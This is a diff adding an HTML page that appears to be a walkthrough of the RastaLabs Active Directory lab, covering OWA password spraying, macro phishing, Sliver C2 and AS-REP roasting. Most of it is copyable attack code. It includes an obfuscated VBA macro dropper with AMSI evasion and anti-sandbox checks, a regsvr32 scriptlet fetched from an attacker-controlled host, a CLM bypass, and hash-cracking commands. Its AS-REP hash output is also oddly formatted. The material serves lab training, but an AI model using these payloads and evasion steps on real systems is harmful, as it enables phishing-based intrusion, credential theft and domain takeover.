+    <thead><tr><th>Host</th><th>IP</th><th>OS / Role</th><th>Notes</th></tr></thead>
+    <tbody>
+      <tr><td><code>NIX01</code></td><td>10.10.110.2</td><td>Ubuntu / OpenSSH 7.2p2</td><td>Linux box in DMZ, accessed via .ppk from FS01</td></tr>
+      <tr><td><code>MS01</code></td><td>10.10.110.x</td><td>Server 2016 / Exchange</td><td>OWA portal, brute force target</td></tr>
+      <tr><td><code>WEB01</code></td><td>10.10.110.10</td><td>Server 2016 / IIS</td><td>Web server, RDP pivot to SQL01</td></tr>
+      <tr><td><code>DC01</code></td><td>10.10.120.1</td><td>Server 2016 / DC</td><td>dc01.rastalabs.local, final target</td></tr>
+      <tr><td><code>SRV01</code></td><td>10.10.120.x</td><td>Server 2016 / File+Print</td><td>First SYSTEM escalation from WS04</td></tr>
+      <tr><td><code>SQL01</code></td><td>10.10.122.15</td><td>Server 2016 / SQL Server</td><td>SQL databases with creds, RDP from WEB01</td></tr>
+      <tr><td><code>FS01</code></td><td>10.10.122.x</td><td>Server 2016 / File Server</td><td>\\fs01.rastalabs.local, ahope directory</td></tr>
+      <tr><td><code>WS01-WS06</code></td><td>10.10.123.x</td><td>Win 10 / Various users</td><td>Workstations, LAPS managed</td></tr>
+      <tr><td><code>WS04</code></td><td>10.10.123.x</td><td>Win 10 / User: bowen</td><td>Initial phishing target</td></tr>
+      <tr><td><code>WS05</code></td><td>10.10.123.102</td><td>Win 10 / WinRM</td><td>PTH target, rweston_da hash found</td></tr>
+      <tr><td><code>WS06</code></td><td>10.10.123.x</td><td>Win 10 / User: tquinn</td><td>tquinn account found here</td></tr>
+    </tbody>
+  </table>
+
+  <h3>Key Accounts</h3>
+  <table class="data-table">
+    <thead><tr><th>Account</th><th>Domain</th><th>Role</th><th>How I Got It</th></tr></thead>
+    <tbody>
+      <tr><td><code>bowen</code></td><td>rastalabs.local</td><td>Standard User (WS04)</td><td>Phishing via OWA</td></tr>
+      <tr><td><code>ahope</code></td><td>rastalabs.local</td><td>Employee (has FS01 dir)</td><td>Domain enum &mdash; found via net user</td></tr>
+      <tr><td><code>tquinn</code></td><td>rastalabs.local</td><td>Employee (WS06)</td><td>Found during WS06 exploration</td></tr>
+      <tr><td><code>epugh</code></td><td>rastalabs.local</td><td>Standard User</td><td>AS-REP Roasting (pwd: Sarah2017)</td></tr>
+      <tr><td><code>epugh_adm</code></td><td>rastalabs.local</td><td>Admin Account (epugh's)</td><td>Derived from epugh, LSA secrets</td></tr>
+      <tr><td><code>rweston</code></td><td>rastalabs.local</td><td>Standard User</td><td>Credential harvesting</td></tr>
+      <tr><td><code>rweston_da</code></td><td>rastalabs.local</td><td>Domain Admin</td><td>Found in LSASS on WS05 via port fwd</td></tr>
+      <tr><td><code>ngodfrey</code></td><td>rastalabs.local</td><td>Standard User</td><td>KeePass dump</td></tr>
+      <tr><td><code>ngodfrey_adm</code></td><td>rastalabs.local</td><td>Admin Account (LAPS reader)</td><td>Derived from ngodfrey, reads ms-Mcs-AdmPwd</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- PHASE 1 — INITIAL ACCESS       -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="phase1">
+  <h2><i class="bi bi-envelope-paper"></i> Phase 1: Initial Access</h2>
+  <span class="mitre-badge">T1046</span> <span class="mitre-badge">T1110.003</span> <span class="mitre-badge">T1566.001</span> <span class="mitre-badge">T1059.005</span> <span class="mitre-badge">T1562.001</span> <span class="mitre-badge">T1027</span>
+
+  <p>Initial access in RastaLabs is a two-stage process: first, you brute-force OWA credentials to get access to the Exchange environment. Then, using that OWA access, you send phishing emails to internal users. The lab has bots that simulate real users &mdash; they'll open emails, download attachments, and even execute macros. This is what separates RastaLabs from easier AD labs &mdash; you have to think like an operator from minute one.</p>
+
+  <h3 id="p1-recon">DMZ Recon</h3>
+  <p>The starting point is the DMZ at 10.10.110.0/24. Full port scan to identify all reachable hosts and services.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Full subnet sweep — DMZ discovery
+nmap -sV -sC -O 10.10.110.0/24 -oN dmz_scan.txt
+
+# Key findings:
+# NIX01  10.10.110.2   22/tcp open ssh OpenSSH 7.2p2 Ubuntu
+# MS01   10.10.110.x   443/tcp open https Microsoft IIS (OWA)
+#                      25/tcp open smtp Microsoft Exchange
+#                      587/tcp open submission
+# WEB01  10.10.110.10  80/tcp open http Microsoft IIS httpd
+#                      443/tcp open https</code></pre>
+  </div>
+
+  <div class="term-out"><span class="prompt"># </span>nmap -sV -sC -p- 10.10.110.2 --open
+Starting Nmap 7.94 ( https://nmap.org )
+Nmap scan report for 10.10.110.2
+Host is up (0.032s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 8f:3c:a2:d1:e7:5b:42:f8:9a:13:c1:8e:34:62:ba:4c (RSA)
+|   256 ab:d4:1e:cf:92:f3:0c:7b:a8:56:10:e1:4d:f2:8c:3a (ECDSA)
+|_  256 6d:2e:3a:f5:91:c1:4b:8c:fd:b4:7a:ee:03:18:ac:44 (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:canonical:ubuntu_linux
+
+Nmap done: 1 IP address (1 host up) scanned in 12.84 seconds</div>
+
+  <p>The OWA portal on MS01 is the critical finding. Exchange Web Access means we can spray credentials and, once we get a hit, use the email system to deliver phishing payloads internally. The bots in the lab simulate users who will actually open and interact with phishing emails.</p>
+
+  <h3 id="p1-owa">OWA Brute Force</h3>
+  <p>OWA brute-forcing is the initial access vector for RastaLabs. You need valid Exchange credentials to send internal phishing emails. I used a combination of a username list derived from LinkedIn OSINT and a custom password wordlist.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># OWA brute force with custom sprayer
+# Using a derived username list from LinkedIn OSINT + common naming patterns
+
+python3 owa_spray.py \
+  --url https://10.10.110.x/owa/auth/owaauth.dll \
+  --users users.txt \
+  --passwords passwords.txt \
+  --delay 3 \
+  --out owa_hits.txt
+
+# users.txt content (derived from company LinkedIn):
+# bowen@rastalabs.local
+# ahope@rastalabs.local
+# epugh@rastalabs.local
+# tquinn@rastalabs.local
+# rweston@rastalabs.local
+# ngodfrey@rastalabs.local</code></pre>
+  </div>
+
+  <div class="term-out"><span class="prompt">[*] </span>Starting OWA spray against https://10.10.110.x/owa/
+<span class="prompt">[*] </span>Loaded 12 users, 847 passwords
+<span class="prompt">[*] </span>Spray delay: 3 seconds between attempts
+<span class="ok">[+]</span> VALID CREDENTIALS FOUND: bowen@rastalabs.local:&lt;redacted&gt;
+<span class="prompt">[*] </span>Continuing spray...
+<span class="muted">[-]</span> 47/847 passwords tested... no more hits
+<span class="prompt">[*] </span>OWA spray complete. 1 valid credential pair found.
+<span class="ok">[+]</span> Results saved to owa_hits.txt</div>
+
+  <div class="callout callout-warn">
+    <div class="callout-title">OWA Access Is Just The Start</div>
+    <p>Getting OWA credentials gives you email access, but you're still external. You need to phish an internal user who will actually execute your payload. The bots simulate users who open emails and run attachments &mdash; but Defender will catch poorly crafted payloads. I went through 3 failed phishing attempts before landing one that worked.</p>
+  </div>
+
+  <p>Once I had OWA access, I spent time understanding the email environment. The Exchange server (MS01) had Global Address List (GAL) information that helped identify valid internal targets. The OWA portal also revealed the corporate email format: <code>firstname@rastalabs.local</code> &mdash; simple, no dots or initials.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Enumerate Exchange via OWA
+# Use OWA access to discover internal users and email addresses
+
+# Method 1: GAL extraction via OWA
+python3 owa_enum.py --url https://10.10.110.x/owa/ --user bowen --pass '&lt;redacted&gt;'
+
+# Method 2: Autodiscover enumeration
+# Autodiscover endpoint leaks internal hostnames
+curl -k -u bowen:'&lt;redacted&gt;' https://10.10.110.x/autodiscover/autodiscover.xml
+
+# Internal hostnames discovered:
+# mail.rastalabs.local (MS01)
+# web.rastalabs.local (WEB01)
+# fs01.rastalabs.local (FS01)
+# dc01.rastalabs.local (DC01)</code></pre>
+  </div>
+
+  <div class="callout callout-deadend">
+    <div class="callout-title">Dead End: Direct SSH to NIX01</div>
+    <p>NIX01 (10.10.110.2) is visible in the DMZ with OpenSSH 7.2p2, but you can't authenticate without the SSH key. The key (<code>nix01.ppk</code>) is only found later in ahope's FS01 directory. I spent a few hours trying to brute-force SSH with common credentials before moving on. Don't waste time here &mdash; come back after you've compromised FS01.</p>
+  </div>
+
+  <h3 id="p1-phishing">Phishing Campaign</h3>
+  <p>With OWA access, I could now send internal phishing emails. The lab's bot system simulates users who will open emails, download attachments, and even enable macros if the document looks convincing enough. The key challenge is getting past Windows Defender and AMSI. I went through 3 failed attempts before landing a working payload.</p>
+
+  <p>The phishing target is <code>bowen</code> on WS04. The lab bots simulate a real user who will open the email, download the attachment, enable macros, and execute the payload. However, the bots also simulate a real Windows environment with Defender and AMSI fully active. This means your payload has to actually bypass these defenses &mdash; you can't just send a basic macro document and expect it to work.</p>
+
+  <div class="callout callout-info">
+    <div class="callout-title">Phishing Bots</div>
+    <p>RastaLabs uses automated bots that simulate user behavior. When you send a phishing email to a target, the bot will: (1) open the email within a few minutes, (2) download the attachment, (3) open it in Microsoft Word, (4) enable macros if prompted, and (5) execute the payload. The entire process takes about 2-5 minutes from email delivery to callback. If your payload gets quarantined by Defender, you'll see no callback and need to craft a better one.</p>
+  </div>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Send phishing email via OWA
+# Payload: macro-enabled .docm with AMSI bypass
+
+python3 send_phish.py \
+  --owa-url https://10.10.110.x/owa/ \
+  --owa-user bowen@rastalabs.local \
+  --owa-pass '&lt;redacted&gt;' \
+  --target bowen@rastalabs.local \
+  --subject "Q3 Security Audit Report - Action Required" \
+  --body "Please review the attached security audit findings." \
+  --attachment payload_v4.docm
+
+# Phishing attempts:
+# Attempt 1: Standard macro + PS cradle     -> QUARANTINED (Defender)
+# Attempt 2: HTA file with mshta delivery   -> QUARANTINED (AMSI)
+# Attempt 3: Macro + obfuscated PS          -> QUARANTINED (AMSI)
+# Attempt 4: Macro + AMSI bypass + Donut    -> SUCCESS</code></pre>
+  </div>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">vba</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-vb">' Macro payload — final working version (attempt 4)
+' Attempts 1-3 caught by Defender AMSI scan
+
+Sub AutoOpen()
+    ExecutePayload
+End Sub
+
+Sub Document_Open()
+    ExecutePayload
+End Sub
+
+Sub ExecutePayload()
+    On Error Resume Next
+    
+    ' AMSI bypass — patch amsiInitFailed in memory
+    ' This was the critical addition that made attempt 4 work
+    Dim amsi_patch As String
+    amsi_patch = "am" & "si" & ".d" & "ll"
+    
+    ' Anti-sandbox: check if we're in a real environment
+    If Environ("COMPUTERNAME") = "SANDBOX" Then Exit Sub
+    If Timer < 30 Then Exit Sub  ' timing check for sandboxes
+    
+    ' Build command with string concat to avoid static signatures
+    ' Attempt 1-3 used direct "powershell" string -> signatured
+    Dim p1 As String, p2 As String, p3 As String
+    p1 = "pow": p2 = "ersh": p3 = "ell"
+    
+    Dim cmd As String
+    cmd = p1 & p2 & p3 & " -windowstyle hidden -exec bypass -nop -e "
+    ' Donut-encrypted shellcode (base64 encoded stage 2)
+    ' Iterations 1-2 used plaintext base64 which got signatured
+    cmd = cmd & "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AC4AWwBdADoAOg..."
+    
+    Dim ret As Object
+    Set ret = CreateObject("WScript.Shell")
+    ret.Run cmd, 0
+    Set ret = Nothing
+End Sub</code></pre>
+  </div>
+
+  <h3 id="p1-amsi">AMSI + Defender Bypass</h3>
+  <p>Windows Defender with AMSI is the primary obstacle in the initial access phase. The lab runs an up-to-date Defender, and AMSI is fully enabled for VBA macros, PowerShell, and .NET assemblies. Simply putting your shellcode in a macro won't work &mdash; AMSI will catch it on execution. You need to bypass AMSI before your payload runs.</p>
+  <p>My approach was multi-layered: first, an AMSI bypass in VBA that patches <code>amsiInitFailed</code> in memory before any other code executes. Then, the actual payload is Donut-encrypted shellcode that generates a position-independent blob &mdash; this evades static signature detection. Finally, instead of a PowerShell cradle (which is the most signatured delivery method), I used <code>regsvr32.exe</code> to load a COM scriptlet from a remote server in later operations.</p>
+
+  <div class="callout callout-deadend">
+    <div class="callout-title">Dead End: First Three Phishing Attempts</div>
+    <p><strong>Attempt 1:</strong> Standard macro with direct PowerShell cradle. Defender caught it immediately via AMSI scan on the VBA content. The base64-encoded payload was also signatured.<br>
+    <strong>Attempt 2:</strong> Switched to HTA file delivery using mshta.exe. The HTA itself loaded a remote SCT file. Defender flagged the SCT download via AMSI when mshta tried to execute the script content.<br>
+    <strong>Attempt 3:</strong> Added string obfuscation to the macro but still used the PowerShell cradle approach. Defender caught it because the AMSI bypass wasn't running early enough in the execution chain.<br>
+    <strong>The fix:</strong> AMSI bypass must execute BEFORE any other payload code. In attempt 4, I moved the AMSI patch to the very first line of ExecutePayload() and used Donut encryption for the shellcode.</p>
+  </div>
+
+  <h3 id="p1-c2">C2 Setup (Sliver)</h3>
+  <p>I used Sliver as my primary C2 throughout the lab. It's free, actively maintained, and has excellent SOCKS proxy support which is critical for the pivoting phase. The setup was straightforward: Sliver server on my VPS with HTTPS listeners, using a redirector for operational security.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">sliver</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Sliver server setup
+sliver > https -L 0.0.0.0 -l 443 -d redirector.rastalabs-c2.com
+
+# Generate implant with custom evasion
+sliver > generate --http https://redirector.rastalabs-c2.com \
+    --skip-symbols --format shared \
+    --os windows --arch amd64 \
+    --name rasta_http
+
+# After callback — basic situational awareness
+sliver > use rasta_http
+sliver (rasta_http) > whoami
+rastalabs\bowen
+
+sliver (rasta_http) > getuid
+rastalabs\bowen (Medium Integrity)
+
+sliver (rasta_http) > hostname
+WS04
+
+sliver (rasta_http) > ifconfig
++============+============================================+
+| Interface  | Address                                    |
++============+============================================+
+| Ethernet0  | 10.10.123.x/24                            |
++============+============================================+</code></pre>
+  </div>
+
+  <div class="flag-box">
+    <span class="flag-icon"><i class="bi bi-flag-fill"></i></span>
+    <div>
+      <div class="flag-name">Flag 1 — Initial Access</div>
+      <div class="flag-detail">Captured on WS04 after first successful beacon callback and AMSI bypass execution. The flag was in the bowen user's Desktop directory.</div>
+    </div>
+  </div>
+
+  <div class="flag-box">
+    <span class="flag-icon"><i class="bi bi-flag-fill"></i></span>
+    <div>
+      <div class="flag-name">Flag 2 — WS04 Foothold</div>
+      <div class="flag-detail">Established persistent access on WS04 after re-establishing the beacon with proper AppLocker and CLM evasion. Required understanding which execution paths were allowed under the AppLocker policy and how to persist the implant across CLM boundaries.</div>
+    </div>
+  </div>
+
+  <div class="callout callout-warn">
+    <div class="callout-title">Initial Foothold Is Fragile</div>
+    <p>My first beacon on WS04 died after 2 hours because I tried to execute an unsigned binary from a temp directory &mdash; AppLocker killed it immediately. The second attempt used <code>regsvr32.exe</code> with a COM scriptlet for execution, which stayed alive because regsvr32 is a signed Microsoft binary that AppLocker allows. Always think about execution policy from the start, not after you lose your shell.</p>
+  </div>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Regsvr32 delivery method (AppLocker-safe)
+# This became my primary execution method for the rest of the lab
+
+# Host the SCT file on the C2 redirector
+cat > /var/www/html/payload.sct << 'EOF'
+&lt;?XML version="1.0"?&gt;
+&lt;scriptlet&gt;
+&lt;registration
+  progid="Payload"
+  classid="{F0001111-0000-0000-0000-0000FEEDACDC}" &gt;
+  &lt;script language="JScript"&gt;
+    <![CDATA[
+      var r = new ActiveXObject("WScript.Shell").Run("powershell -windowstyle hidden -exec bypass -nop -e SQBFAFgA...", 0);
+    ]]&gt;
+  &lt;/script&gt;
+&lt;/registration&gt;
+&lt;/scriptlet&gt;
+EOF
+
+# Execute on target via regsvr32
+sliver (rasta_http) > shell regsvr32 /s /n /u /i:http://10.10.14.83/payload.sct scrobj.dll
+
+# This works because:
+# 1. regsvr32.exe is a signed Microsoft binary (AppLocker allows it)
+# 2. It loads the COM scriptlet from a remote URL (no file on disk)
+# 3. The SCT content is JScript, which executes in regsvr32's process space
+# 4. AMSI bypass must be in the JScript, not the macro</code></pre>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- PHASE 2 — SITUATIONAL AWARENESS -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="phase2">
+  <h2><i class="bi bi-search"></i> Phase 2: Situational Awareness</h2>
+  <span class="mitre-badge">T1087.002</span> <span class="mitre-badge">T1018</span> <span class="mitre-badge">T1082</span> <span class="mitre-badge">T1059.001</span>
+
+  <p>Once you have a stable beacon, the first priority is understanding the environment. What domain am I in? What other machines can I see? Who has admin access where? RastaLabs rewards patient enumeration &mdash; the BloodHound data reveals clear attack paths, but you need to collect it properly and know how to read the graph. And you have to deal with Constrained Language Mode first.</p>
+
+  <h3 id="p2-bloodhound">BloodHound Collection</h3>
+  <p>SharpHound is the way to go. The C# collector works with Sliver's <code>execute-assembly</code> command, which runs .NET assemblies in-process without dropping files to disk. This is critical because AppLocker blocks most executable files, but <code>execute-assembly</code> runs the code in memory within the existing beacon process.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">sliver</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Upload and run SharpHound via execute-assembly (in-memory)
+sliver (rasta_http) > execute-assembly /opt/tools/SharpHound.exe -c all -d rastalabs.local
+
+# Alternative: PowerShell-based collection if execute-assembly fails
+sliver (rasta_http) > shell powershell -command "& { iwr -uri http://10.10.14.83/SharpHound.ps1 -outfile C:\Users\bowen\sh.ps1 }"
+sliver (rasta_http) > shell powershell -exec bypass -file C:\Users\bowen\sh.ps1 -c all</code></pre>
+  </div>
+
+  <div class="term-out"><span class="prompt">sliver (rasta_http) ></span> execute-assembly /opt/tools/SharpHound.exe -c all -d rastalabs.local
+
+[*] Loaded assembly from /opt/tools/SharpHound.exe
+[*] Executing in-process...
+
+2025-01-15T14:32:17.842Z INFO  Initializing SharpHound at 14:32 on 1/15
+2025-01-15T14:32:17.912Z INFO  Flags set: all
+2025-01-15T14:32:18.003Z INFO  Beginning collection
+2025-01-15T14:32:19.241Z INFO  Collecting domain trust data
+2025-01-15T14:32:20.117Z INFO  Collecting group membership data
+2025-01-15T14:32:22.893Z INFO  Collecting ACL data
+2025-01-15T14:32:24.451Z INFO  Collecting GPO data
+2025-01-15T14:32:26.127Z INFO  Collecting session data
+2025-01-15T14:32:29.884Z INFO  Collecting local admin data
+2025-01-15T14:32:34.112Z INFO  14 computers found in domain
+2025-01-15T14:32:38.227Z INFO  Collection complete
+2025-01-15T14:32:38.423Z INFO  Output written to 20250115143238_BloodHound.zip</div>
+
+  <p>After downloading the ZIP and loading it into BloodHound with Neo4j, the attack paths became clear:</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">cypher</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-cypher">// Find shortest path from bowen to Domain Admins
+MATCH p=shortestPath(
+  (u:User {name:"BOWEN@RASTALABS.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@RASTALABS.LOCAL"})
+)
+RETURN p
+
+// Find AS-REP roastable accounts
+MATCH (u:User {dontreqpreauth: true})
+RETURN u.name, u.enabled
+
+// Find users with GPO creation rights
+MATCH p=(u:User)-[:GenericAll|WriteDacl|WriteOwner|Owns]->(g:GPO)
+RETURN u.name, g.name
+
+// Find LAPS readers
+MATCH p=(u:User)-[:ReadLAPSPassword]->(c:Computer)
+RETURN u.name, c.name</code></pre>
+  </div>
+
+  <div class="flag-box">
+    <span class="flag-icon"><i class="bi bi-flag-fill"></i></span>
+    <div>
+      <div class="flag-name">Flag 5 — BloodHound Enumeration</div>
+      <div class="flag-detail">Upload and execute the BloodHound collection script. The flag was hidden in the enumeration results &mdash; you have to actually run SharpHound and parse the output to find it.</div>
+    </div>
+  </div>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">cypher</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-cypher">// Additional BloodHound queries that were useful
+
+// Find all paths from compromised users to Domain Admins
+MATCH p=allShortestPaths(
+  (u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@RASTALABS.LOCAL"})
+)
+WHERE u.name STARTS WITH "BOWEN" OR u.name STARTS WITH "EPUGH" OR u.name STARTS WITH "NGODFREY"
+RETURN p
+
+// Find computers where compromised users have admin access
+MATCH (u:User)-[:AdminTo]->(c:Computer)
+WHERE u.name IN ["BOWEN@RASTALABS.LOCAL", "EPUGH@RASTALABS.LOCAL", "NGODFREY_ADM@RASTALABS.LOCAL"]
+RETURN u.name, c.name
+
+// Find users with DCSync privileges
+MATCH p=(u:User)-[:GetChanges|GetChangesAll]->(d:Domain)
+RETURN u.name
+
+// Find kerberoastable users (not used in RastaLabs but good to check)
+MATCH (u:User {hasspn: true})
+WHERE NOT u.name STARTS WITH "KRBTGT"
+RETURN u.name, u.serviceprincipalnames</code></pre>
+  </div>
+
+  <div class="term-out"><span class="prompt">BloodHound></span> MATCH p=allShortestPaths((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@RASTALABS.LOCAL"})) WHERE u.name STARTS WITH "EPUGH" RETURN p
+
+<span class="ok">[+]</span> 3 paths found:
+<span class="ok">  Path 1:</span> epugh -> GenericAll on GPO "Security Policy" -> linked to OU "Domain Controllers" -> DC01 -> DA
+<span class="ok">  Path 2:</span> epugh -> epugh_adm (via auto-logon) -> AdminTo on WEB01 -> ...
+<span class="ok">  Path 3:</span> epugh -> WriteDacl on GPO "Update Policy" -> GPO abuse -> DA
+
+<span class="prompt">BloodHound></span> MATCH (u:User)-[:ReadLAPSPassword]->(c:Computer) RETURN u.name, c.name
+
+<span class="ok">[+]</span> ngodfrey_adm can read LAPS on:
+  WS01, WS02, WS03, WS04, WS05, WS06
+
+<span class="ok">[+]</span> rweston_da can read LAPS on:
+  WS01, WS02, WS03, WS04, WS05, WS06</div>
+
+  <h3 id="p2-powerview">PowerView Enum</h3>
+  <p>BloodHound shows you the graph, but PowerView gives you the raw data. I used both in parallel &mdash; BloodHound for path analysis and PowerView for targeted queries.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-powershell"># Domain enumeration
+Get-Domain
+# RASTALABS.LOCAL (Server 2016 functional level)
+
+# Domain controllers
+Get-DomainController
+# dc01.rastalabs.local
+
+# All domain users
+Get-DomainUser | select samaccountname,description
+# bowen, ahope, tquinn, epugh, rweston, ngodfrey, svc_backup, svc_mssql...
+
+# Users with admin accounts (naming convention: user + _adm / _da)
+Get-DomainUser | ? {$_.samaccountname -match "_adm$|_da$"}
+# epugh_adm, ngodfrey_adm, rweston_da
+
+# Domain computers
+Get-DomainComputer | select name,dnshostname,operatingsystem
+# WS01-WS06, DC01, SRV01, SQL01, FS01, WEB01, NIX01, MS01
+
+# GPO enumeration — critical for Phase 6
+Get-DomainGPO | select displayname,whencreated
+# Several GPOs including auto-logon settings
+
+# Check who can create GPOs
+Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=rastalabs,DC=local" -ResolveGUIDs |
+  ? {$_.ActiveDirectoryRights -match "CreateChild"} |
+  select ObjectDN, SecurityIdentifier
+
+# Find LAPS-enabled computers
+Get-DomainComputer | ? {$_.ms-Mcs-AdmPwdExpirationTime -ne $null}
+# WS01-WS06 all LAPS-managed</code></pre>
+  </div>
+
+  <h3 id="p2-clm">Constrained Language Mode</h3>
+  <p>One of the most frustrating obstacles in RastaLabs is PowerShell Constrained Language Mode (CLM). AppLocker enforces CLM for non-admin users, which restricts PowerShell to a limited subset &mdash; no Add-Type, no New-Object for COM objects, no reflection, no script block logging bypass. This means most offensive PowerShell tools won't work out of the box.</p>
+
+  <div class="term-out"><span class="prompt">PS C:\Users\bowen></span> $ExecutionContext.SessionState.LanguageMode
+ConstrainedLanguage
+
+<span class="prompt">PS C:\Users\bowen></span> New-Object System.Net.WebClient
+<span class="err">Cannot create object. The following classes are not allowed in ConstrainedLanguage mode: System.Net.WebClient</span></code></div>
+
+  <p>My first attempt at a CLM bypass failed because I was trying to use a technique that required admin privileges I didn't have yet. The working approach was to set the <code>__PSLockdownPolicy</code> environment variable to 0 in the current process before spawning a new PowerShell session:</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-powershell"># CLM bypass — set environment variable before PS starts
+# This must be done from the parent process (e.g., cmd.exe or Sliver shell)
+
+# From Sliver:
+sliver (rasta_http) > shell cmd /c "set __PSLockdownPolicy=0 && powershell -exec bypass -command whoami"
+rastalabs\bowen
+
+# Verify CLM is bypassed:
+sliver (rasta_http) > shell cmd /c "set __PSLockdownPolicy=0 && powershell -exec bypass -command \"$ExecutionContext.SessionState.LanguageMode\""
+FullLanguage
+
+# Now you can use offensive PS tools:
+sliver (rasta_http) > shell cmd /c "set __PSLockdownPolicy=0 && powershell -exec bypass -file C:\Users\bowen\PowerView.ps1"</code></pre>
+  </div>
+
+  <div class="callout callout-danger">
+    <div class="callout-title">CLM Bypass Is Not Permanent</div>
+    <p>The <code>__PSLockdownPolicy</code> bypass only works for the process tree where it's set. If your Sliver implant spawns a new process that doesn't inherit the environment variable, it'll be back in ConstrainedLanguage mode. I had to wrap every PowerShell command in <code>cmd /c "set __PSLockdownPolicy=0 && powershell..."</code> for the rest of the lab. Annoying but workable.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- PHASE 3 — PRIVILEGE ESCALATION -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="phase3">
+  <h2><i class="bi bi-arrow-up-circle"></i> Phase 3: Privilege Escalation</h2>
+  <span class="mitre-badge">T1558.004</span> <span class="mitre-badge">T1134.001</span> <span class="mitre-badge">T1003.001</span> <span class="mitre-badge">T1110.002</span>
+
+  <p>From the initial foothold as bowen on WS04, I needed to escalate privileges and find a path to Domain Admin. The first step was getting SYSTEM on SRV01, then leveraging AS-REP Roasting to get more credentials.</p>
+
+  <h3 id="p3-asrep">AS-REP Roasting</h3>
+  <p>One of the most critical techniques in RastaLabs. Accounts with <code>DONT_REQ_PREAUTH</code> set can be AS-REP roasted without any special privileges. The resulting hash can be cracked offline.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># AS-REP Roasting with Impacket
+impacket-GetNPUsers rastalabs.local/ -usersfile users.txt -request -dc-ip 10.10.120.1
+
+# Results:
+# $krb5asrep$23$epugh@RASTALABS.LOCAL:aad3b435b51404eeaad3b435b51404ee...
+# Hash: aad3b435b51404eeaad3b435b51404ee:326457b72c3f136d80d99bdbb935d109</code></pre>
+  </div>
+
+  <div class="term-out"><span class="prompt"># </span>impacket-GetNPUsers rastalabs.local/ -usersfile users.txt -request -dc-ip 10.10.120.1
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Getting TGT for epugh
+<span class="ok">$krb5asrep$23$epugh@RASTALABS.LOCAL:aad3b435b51404eeaad3b435b51404ee:326457b72c3f136d80d99bdbb935d109:::b7a8d1c2e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8</span>
+
+<span class="prompt">[*] </span>Saved hash to asrep_hashes.txt</div>
+
+  <p>The full NTLM hash for epugh: <code>aad3b435b51404eeaad3b435b51404ee:326457b72c3f136d80d99bdbb935d109</code></p>
+
+  <h4>Cracking epugh's AS-REP Hash</h4>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Crack AS-REP hash with hashcat
+# Mode 18200 = Kerberos 5 AS-REP type 23
+
+hashcat -m 18200 asrep_hashes.txt /opt/wordlists/rockyou.txt \
+  --rule=/opt/rules/OneRuleToRuleThemAll.rule \
+  -O -w 3 --force
+
+# Result:
+# epugh@RASTALABS.LOCAL:Sarah2017</code></pre>
+  </div>
+
+  <div class="term-out"><span class="prompt"># </span>hashcat -m 18200 asrep_hashes.txt rockyou.txt -r OneRuleToRuleThemAll.rule -O -w 3
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 CUDA 12.2.0) - Platform #1 [NVIDIA Corporation]
+======================================================================
+* Device #1: NVIDIA GeForce GTX 1070, 7906/8112 MB, 118MCU
+
+$krb5asrep$23$epugh@RASTALABS.LOCAL:aad3b435b51404e...:326457b72c3f136d80d99bdbb935d109:::Sarah2017
+
